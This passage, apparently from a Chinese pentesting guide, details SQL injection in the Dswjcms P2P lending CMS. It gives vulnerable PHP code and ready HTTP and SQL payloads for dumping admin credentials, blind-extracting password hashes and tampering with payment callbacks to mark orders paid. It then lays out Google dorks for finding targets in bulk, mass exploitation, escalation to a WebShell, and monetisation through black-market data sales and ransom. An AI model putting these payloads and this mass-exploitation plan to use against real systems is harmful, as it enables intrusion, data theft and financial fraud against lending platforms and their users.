     ├─ 原始请求: bid=1 (数字型)
     ├─ 测试1: bid=1' (单引号，观察错误)
     ├─ 测试2: bid=1 AND 1=1 (布尔盲注)
     ├─ 测试3: bid=1) AND SLEEP(6) (时间盲注)
     └─ 测试4: bid=-1 UNION SELECT 1,2,3,4,5,6,7,8 (联合查询)

步骤5: 确认注入点
  ├─ 观察响应差异（页面内容/响应时间）
  ├─ 确认数据库类型（MySQL）
  ├─ 判断是否需要伪静态去除（去掉.html后缀）
  └─ 构造完整利用链
```

### 利用方法

**漏洞点1: invest函数中的bid参数（联合查询注入）**

```php
// 漏洞代码: /Lib/Action/Home/CenterAction.class.php
public function invest(){
    $refund = M('collection');
    if($this->_get('bid') && $this->_get('mid')=='plan'){
        // 还款计划
        $refun = $refund->where('bid='.$this->_get('bid').' and uid='.$this->_session('user_uid'))->select();
        // 直接拼接，未过滤bid参数
    }
}
```

**利用Payload**：
```http
GET /Center/invest/?mid=plan&bid=1) UNION SELECT 1,concat(username,0x2c,password),3,4,5,6,7,8 from ds_admin%23 HTTP/1.1
Host: target.com
Cookie: PHPSESSID=logged_in_session_id
```

```sql
-- 完整利用链
-- 1. 确认注入点
bid=1 AND 1=1      -- 正常
bid=1 AND 1=2      -- 异常

-- 2. 判断列数
bid=1 ORDER BY 8   -- 正常
bid=1 ORDER BY 9   -- 报错（确认8列）

-- 3. 联合查询提取管理员账号密码
bid=-1 UNION SELECT 1,concat(username,0x2c,password),3,4,5,6,7,8 from ds_admin-- -
-- 使用concat将用户名和密码组合，0x2c是逗号的十六进制

-- 4. 获取所有数据库
bid=-1 UNION SELECT 1,group_concat(schema_name),3,4,5,6,7,8 from information_schema.schemata-- -

-- 5. 获取当前库所有表
bid=-1 UNION SELECT 1,group_concat(table_name),3,4,5,6,7,8 from information_schema.tables where table_schema=database()-- -

-- 6. 获取用户表结构
bid=-1 UNION SELECT 1,group_concat(column_name),3,4,5,6,7,8 from information_schema.columns where table_name='ds_user'-- -
```

**漏洞点2: loan函数中的bid参数（盲注）**

```php
// 漏洞代码
public function loan(){
    $borrowing = M('borrowing');
    $borrow = $borrowing->field('money')->where('`id`='.$this->_get('bid'))->find();
    // 直接拼接，未过滤bid参数
}
```

**利用Payload**：
```http
GET /Center/loan/?mid=plan&bid=1) AND (SELECT * FROM (SELECT(SLEEP(6)))test) AND 'wooyun'='wooyun'%23 HTTP/1.1
Host: target.com
Cookie: PHPSESSID=logged_in_session_id
```

```sql
-- 时间盲注链
-- 1. 基础延迟测试
bid=1) AND SLEEP(6)-- -

-- 2. 条件延迟（猜解数据库名）
bid=1) AND IF((SELECT database())='dswjcms',SLEEP(6),0)-- -

-- 3. 逐字符猜解（二分法优化）
bid=1) AND IF(ASCII((SELECT SUBSTRING(database(),1,1)))>100,SLEEP(2),0)-- -

-- 4. 提取管理员密码哈希
bid=1) AND IF(ASCII((SELECT SUBSTRING(password,1,1) FROM ds_admin LIMIT 1))>48,SLEEP(2),0)-- -
```

**漏洞点3: emailVerify函数（POST注入）**

```php
// 漏洞代码
public function emailVerify(){
    $userinfo = M('user');
    $getfield = $userinfo->where("`id`=".$this->_session('user_uid')." and `email`='".$this->_post('email')."'")->find();
    // email参数直接拼接到字符型查询中
}
```

**利用Payload**：
```http
POST /Center/emailVerify/ HTTP/1.1
Host: target.com
Cookie: PHPSESSID=logged_in_session_id
Content-Type: application/x-www-form-urlencoded

email=test') AND (SELECT * FROM (SELECT(SLEEP(6)))test) AND 'wooyun'='wooyun'%23
```

```sql
-- 字符型注入链
-- 1. 闭合单引号
email=admin'--

-- 2. 时间盲注
email=admin' AND SLEEP(6)-- -

-- 3. 布尔盲注（验证邮箱）
email=admin' AND (SELECT COUNT(*) FROM ds_user WHERE username='admin')>0-- -

-- 4. 报错注入（MySQL 5.x）
email=admin' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))-- -
```

**漏洞点4: alipayreturn函数（第三方支付回调注入）**

```php
// 漏洞代码
public function alipayreturn(){
    $recharge = M('recharge');
    $rechar = $recharge->where('nid='.$this->_get('out_trade_no'))->find();
    // out_trade_no参数直接拼接，用于支付回调验证

    $recharge->where('nid='.$this->_get('out_trade_no'))->save(array('type'=>2,'audittime'=>time()));
    // SELECT和UPDATE两处注入
}
```

**利用Payload**：
```http
GET /Center/alipayreturn/?out_trade_no=1) AND (SELECT * FROM (SELECT(SLEEP(6)))test) AND 'wooyun'='wooyun'-- HTTP/1.1
Host: target.com
Cookie: PHPSESSID=logged_in_session_id
```

```sql
-- 支付回调注入的特殊利用
-- 1. 修改充值状态为成功（绕过支付）
out_trade_no=test' OR 1=1-- -
-- 可能导致：所有未支付订单变为已支付

-- 2. 篡改充值金额（需要UPDATE注入）
out_trade_no=test'-- -
-- 配合UPDATE语句的构造需要特殊技巧

-- 3. 盲注获取用户数据
out_trade_no=test') AND SLEEP(6)-- -
```

### 绕过技巧

| 绕过类型 | 具体技巧 | 适用场景 |
|---------|---------|---------|
| **伪静态URL** | 去掉.html后缀直接测试 | ThinkPHP伪静态模式 |
| **框架过滤** | 使用数字型注入绕过GPC | ThinkPHP的I()方法对字符过滤但数字不过滤 |
| **Session验证** | 注册普通账号获取Cookie | 需要登录认证的注入点 |
| **业务逻辑限制** | 构造合法业务数据后测试 | 需要特定业务数据存在（如投资记录） |
| **参数名混淆** | 测试所有ID类参数 | bid, uid, mid, id, nper等 |

**ThinkPHP框架特有的绕过技巧**：

```php
// 框架提供的过滤方法（存在绕过）
$this->_get('param')    // I('get.param') 默认调用htmlspecialchars
$this->_post('param')   // 但数字型注入不受影响
$this->_param('param')  // 自动判断GET/POST

// 绕过方法：
// 1. 使用数字型注入（引号不参与拼接）
$where('id='.$_GET['id'])  // 直接拼接

// 2. 使用M()方法而非D()方法
M('table')  // 返回基础Model，无数据验证
D('table')  // 返回具体Model，可能有字段验证

// 3. 利用数组方法的where子句
$where['id'] = $_GET['id'];  // 数组方式会被过滤
$where['id'] = array('eq', $_GET['id']);  // 可能绕过
```

**伪静态URL的处理技巧**：

```bash
# 原始URL（伪静态）
https://example.com/[已脱敏]

# 转换为GET参数形式
https://example.com/[已脱敏]

# 为什么需要转换？
# 1. 路由解析问题：部分框架对PATH_INFO模式处理不当
# 2. 注入测试方便：更容易修改参数
# 3. 绕过WAF：URL模式可能未被规则覆盖

# 转换规则（ThinkPHP）
# /模块/控制器/方法/参数1/值1/参数2/值2.html
# → ?参数1=值1&参数2=值2
```


### CMS漏洞挖掘通用方法论
**高价值CMS漏洞模式**：

| 漏洞类型 | 关键词搜索 | 典型利用链 |
|---------|-----------|----------|
| **认证后注入** | `where(` + `$this->_get` | 注册账号 → 登录 → 注入 |
| **伪静态绕过** | `.html` + `$this->_param` | 去除后缀 → 参数注入 |
| **支付逻辑** | `recharge` + `alipay` | 修改金额 → 充值成功 |
| **文件上传** | `upload()` + `avatar` | 上传图片 → 包含WebShell |
| **权限提升** | `role` + `level` | 修改Cookie → 管理员权限 |

**实战技巧清单**：

```markdown
□ 1. 注册一个普通会员账号（优先测试低权限）
□ 2. 抓取登录后的Cookie（保存到Burp Suite）
□ 3. 遍历所有业务功能URL（投资、借款、充值等）
□ 4. 提取所有ID类参数（bid, uid, id, mid, nper）
□ 5. 测试数字型注入（无需单引号闭合）
   └─ Payload: id=1 AND 1=1 / id=1 AND 1=2
□ 6. 测试字符型注入（需要闭合引号）
   └─ Payload: name=admin' AND '1'='1
□ 7. 测试伪静态URL（去掉.html后缀）
   └─ /Center/invest/mid/plan/bid/1.html
   └─ → /Center/invest/?mid=plan&bid=1
□ 8. 测试时间盲注（不易被WAF检测）
   └─ Payload: id=1) AND SLEEP(6)--
□ 9. 测试联合查询（最快提取数据）
   └─ Payload: id=-1 UNION SELECT 1,2,3,4,5,6,7,8
□ 10. 利用框架特性（ThinkPHP的M()方法）
   └─ 直接拼接SQL，无自动验证
```

**扩展攻击面**：

```
SQL注入 → 获取管理员密码 → 后台登录 → 文件上传功能 → WebShell
       ↓
   读取敏感配置文件 → 数据库连接信息 → 直接连接数据库 → 导出所有用户数据
       ↓
   支付回调注入 → 篡改充值金额 → 资金损失
       ↓
   批量网贷站点 → 整个行业数据泄露
```

**批量利用关键思路**：

1. **识别阶段**：使用Google Hacking语法快速定位目标
   - `intext:"Powered by Dswjcms"`
   - `intitle:"Dswjcms P2P网贷系统"`
   - `inurl:/Center/invest`

2. **验证阶段**：自动化脚本批量验证漏洞
   - 并发测试（多线程/协程）
   - 智能重试机制
   - 结果去重

3. **利用阶段**：针对高价值目标深度利用
   - 提取敏感数据
   - 获取系统权限
   - 横向渗透

4. **变现阶段**：
   - 数据售卖（黑市）
   - 勒索赎金（匿名化）
   - 漏洞赏金（白帽子路线）

